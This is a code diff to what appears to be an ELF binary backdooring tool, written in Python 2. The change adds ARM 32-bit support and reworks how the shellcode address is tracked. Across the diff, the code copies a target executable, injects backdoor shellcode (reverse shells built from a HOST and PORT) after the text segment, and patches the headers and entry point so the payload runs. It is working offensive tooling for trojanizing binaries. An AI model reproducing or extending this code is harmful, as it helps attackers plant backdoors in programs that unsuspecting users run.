@@ -39,6 +39,7 @@ from intel.LinuxIntelELF32 import linux_elfI32_shellcode
 from intel.LinuxIntelELF64 import linux_elfI64_shellcode
 from intel.FreeBSDIntelELF32 import freebsd_elfI32_shellcode
 #from intel.FreeBSDIntelELF64 import freebsd_elfI64_shellcode
+from arm.LinuxARMLELF32 import linux_elfarmle32_shellcode
 
 
 class elf():
@@ -106,11 +107,13 @@ class elfbin():
         self.SHELL_LEN = SHELL_LEN
         self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
         self.IMAGE_TYPE = IMAGE_TYPE
+        self.shellcode_vaddr = 0x0
         self.supported_types = {0x00:    # System V
                                 [[0x01,  # 32bit
                                   0x02   # 64bit
                                   ],
                                  [0x03,  # x86
+                                  0x28,  # ARM
                                   0x3E   # x64
                                   ]],
                                 0x03:    # Linux
@@ -239,8 +242,7 @@ class elfbin():
         """
         This function sets the shellcode.
         """
-        print "[*] Setting selected shellcode"
-
+        
         self.bintype = False
         if self.e_machine == 0x03:  # x86 chipset
             if self.EI_CLASS == 0x1:
@@ -254,6 +256,10 @@ class elfbin():
                     self.bintype = linux_elfI64_shellcode
                 #elif self.EI_OSABI == 0x09:
                 #    self.bintype = freebsd_elfI64_shellcode
+        elif self.e_machine == 0x28: # ARM chipset
+            if self.EI_CLASS == 0x1:
+                if self.EI_OSABI == 0x00:
+                    self.bintype = linux_elfarmle32_shellcode
 
         if not self.SHELL:
             print "You must choose a backdoor to add: "
@@ -289,7 +295,10 @@ class elfbin():
             return False
         #else:
         #    shell_cmd = self.SHELL + "()"
-        self.shells = self.bintype(self.HOST, self.PORT, self.e_entry, self.SUPPLIED_SHELLCODE)
+        if self.e_machine == 0x28:
+            self.shells = self.bintype(self.HOST, self.PORT, self.e_entry, self.SUPPLIED_SHELLCODE, self.shellcode_vaddr)
+        else:
+            self.shells = self.bintype(self.HOST, self.PORT, self.e_entry, self.SUPPLIED_SHELLCODE)
         self.allshells = getattr(self.shells, self.SHELL)(self.e_entry)
         self.shellcode = self.shells.returnshellcode()
 
@@ -509,6 +518,7 @@ class elfbin():
         5. Physically insert the new code (parasite) and pad to PAGE_SIZE,
             into the file - text segment p_offset + p_filesz (original)
         '''
+        
         self.support_check()
         if self.supported is False:
             "ELF Binary not supported"
@@ -526,23 +536,25 @@ class elfbin():
 
         shutil.copy2(self.FILE, self.backdoorfile)
 
+        
         self.gather_file_info()
+        
+        print "[*] Getting shellcode length"
+
         resultShell = self.set_shells()
         if resultShell is False:
             print "[!] Could not set shell"
             return False
         self.bin_file = open(self.backdoorfile, "r+b")
 
-        shellcode = self.shellcode
-
-        newBuffer = len(shellcode)
+        newBuffer = len(self.shellcode)
 
         self.bin_file.seek(24, 0)
 
         #sh_addr = 0x0
         #offsetHold = 0x0
         #sizeOfSegment = 0x0
-        shellcode_vaddr = 0x0
+        
         headerTracker = 0x0
         PAGE_SIZE = 4096
         #find range of the first PT_LOAD section
@@ -550,13 +562,19 @@ class elfbin():
             #print 'program header', header, values
             if values['p_flags'] == 0x5 and values['p_type'] == 0x1:
                 #print "Found text segment"
-                shellcode_vaddr = values['p_vaddr'] + values['p_filesz']
+                self.shellcode_vaddr = values['p_vaddr'] + values['p_filesz']
                 beginOfSegment = values['p_vaddr']
                 oldentry = self.e_entry
                 sizeOfNewSegment = values['p_memsz'] + newBuffer
                 LOCofNewSegment = values['p_filesz'] + newBuffer
                 headerTracker = header
                 newOffset = values['p_offset'] + values['p_filesz']
+
+        #now that we have the shellcode startpoint, reassgin shellcode, 
+        #  there is no change in size
+        print "[*] Setting selected shellcode"
+
+        resultShell = self.set_shells()
 
         #SPLIT THE FILE
         self.bin_file.seek(0)
@@ -569,8 +587,8 @@ class elfbin():
         #print "Reopen file for adjustments"
         self.bin_file = open(self.backdoorfile, "w+b")
         self.bin_file.write(file_1st_part)
-        self.bin_file.write(shellcode)
-        self.bin_file.write("\x00" * (PAGE_SIZE - len(shellcode)))
+        self.bin_file.write(self.shellcode)
+        self.bin_file.write("\x00" * (PAGE_SIZE - len(self.shellcode)))
         self.bin_file.write(file_2nd_part)
         if self.EI_CLASS == 0x01:
             #32 bit FILE
@@ -587,7 +605,7 @@ class elfbin():
                     self.bin_file.seek(16, 1)
                     self.bin_file.write(struct.pack(self.endian + "I", self.sec_hdr[i]['sh_offset'] + PAGE_SIZE))
                     self.bin_file.seek(20, 1)
-                elif self.sec_hdr[i]['sh_size'] + self.sec_hdr[i]['sh_addr'] == shellcode_vaddr:
+                elif self.sec_hdr[i]['sh_size'] + self.sec_hdr[i]['sh_addr'] == self.shellcode_vaddr:
                     #print "adding newBuffer size"
                     self.bin_file.seek(20, 1)
                     self.bin_file.write(struct.pack(self.endian + "I", self.sec_hdr[i]['sh_size'] + newBuffer))
@@ -599,7 +617,7 @@ class elfbin():
             self.bin_file.seek(self.e_phoff, 0)
             for i in range(self.e_phnum):
                 #print "header range i", i
-                #print "shellcode_vaddr", hex(self.prog_hdr[i]['p_vaddr']), hex(shellcode_vaddr)
+                #print "self.shellcode_vaddr", hex(self.prog_hdr[i]['p_vaddr']), hex(self.shellcode_vaddr)
                 if i == headerTracker:
                     #print "Found Text Segment again"
                     after_textSegment = True
@@ -616,9 +634,9 @@ class elfbin():
                     self.bin_file.seek(32, 1)
 
             self.bin_file.seek(self.e_entryLocOnDisk, 0)
-            self.bin_file.write(struct.pack(self.endian + "I", shellcode_vaddr))
+            self.bin_file.write(struct.pack(self.endian + "I", self.shellcode_vaddr))
 
-            self.JMPtoCodeAddress = shellcode_vaddr - self.e_entry - 5
+            self.JMPtoCodeAddress = self.shellcode_vaddr - self.e_entry - 5
 
         else:
             #64 bit FILE
@@ -634,7 +652,7 @@ class elfbin():
                     self.bin_file.seek(24, 1)
                     self.bin_file.write(struct.pack(self.endian + "Q", self.sec_hdr[i]['sh_offset'] + PAGE_SIZE))
                     self.bin_file.seek(32, 1)
-                elif self.sec_hdr[i]['sh_size'] + self.sec_hdr[i]['sh_addr'] == shellcode_vaddr:
+                elif self.sec_hdr[i]['sh_size'] + self.sec_hdr[i]['sh_addr'] == self.shellcode_vaddr:
                     #print "adding newBuffer size"
                     self.bin_file.seek(32, 1)
                     self.bin_file.write(struct.pack(self.endian + "Q", self.sec_hdr[i]['sh_size'] + newBuffer))
@@ -646,7 +664,7 @@ class elfbin():
             self.bin_file.seek(self.e_phoff, 0)
             for i in range(self.e_phnum):
                 #print "header range i", i
-                #print "shellcode_vaddr", hex(self.prog_hdr[i]['p_vaddr']), hex(shellcode_vaddr)
+                #print "self.shellcode_vaddr", hex(self.prog_hdr[i]['p_vaddr']), hex(self.shellcode_vaddr)
                 if i == headerTracker:
                     #print "Found Text Segment again"
                     after_textSegment = True
@@ -663,9 +681,9 @@ class elfbin():
                     self.bin_file.seek(56, 1)
 
             self.bin_file.seek(self.e_entryLocOnDisk, 0)
-            self.bin_file.write(struct.pack(self.endian + "Q", shellcode_vaddr))
+            self.bin_file.write(struct.pack(self.endian + "Q", self.shellcode_vaddr))
 
-            self.JMPtoCodeAddress = shellcode_vaddr - self.e_entry - 5
+            self.JMPtoCodeAddress = self.shellcode_vaddr - self.e_entry - 5
 
         self.bin_file.close()
         print "[!] Patching Complete"
